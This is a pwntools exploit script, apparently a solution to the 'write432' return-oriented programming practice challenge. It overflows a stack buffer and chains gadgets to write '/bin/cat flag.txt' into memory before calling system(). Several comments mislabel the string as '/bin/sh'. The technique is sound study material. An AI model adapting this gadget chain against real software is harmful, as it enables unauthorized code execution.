#!/usr/bin/env python3

from pwn import *

pwn = process("./write432")
#gdb.attach(pwn, '''
#break main''')

what1 = b'\x2f\x62\x69\x6e'
what2 = b'\x2f\x63\x61\x74' 
what3 = b'\x20\x66\x6c\x61'
what4 = b'\x67\x2e\x74\x78'
what5 = b'\x74\x00\x00\x00'	#/bin/cat flag.txt now @ 0x0804a030


where1 = p32(0x0804a030)
where2 = p32(0x0804a034)
where3 = p32(0x0804a038)
where4 = p32(0x0804a03c)
where5 = p32(0x0804a040)


buf = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'
buf += p32(0x080486da) # pop edi; pop ebp; ret;
buf += where1 # first 4 bytes of string ends up in edi
buf += what1 # first 4 bytes written here
buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;

buf += p32(0x080486da) # pop edi; pop ebp; ret;
buf += where2 # next 4 bytes of string /bin/sh, ends up in edi
buf += what2 # next 4 bytes written here
buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;

buf += p32(0x080486da) # pop edi; pop ebp; ret;
buf += where3 # next 4 bytes of string /bin/sh, ends up in edi
buf += what3 # next 4 bytes written here
buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;

buf += p32(0x080486da) # pop edi; pop ebp; ret;
buf += where4 # next 4 bytes of string /bin/sh, ends up in edi
buf += what4 # next 4 bytes written here
buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;

buf += p32(0x080486da) # pop edi; pop ebp; ret;
buf += where5 # next 4 bytes of string /bin/sh, ends up in edi
buf += what5 # next 4 bytes written here
buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;


buf += p32(0x0804865a) # call system
buf += where1


pwn.sendline(buf)
pwn.interactive()
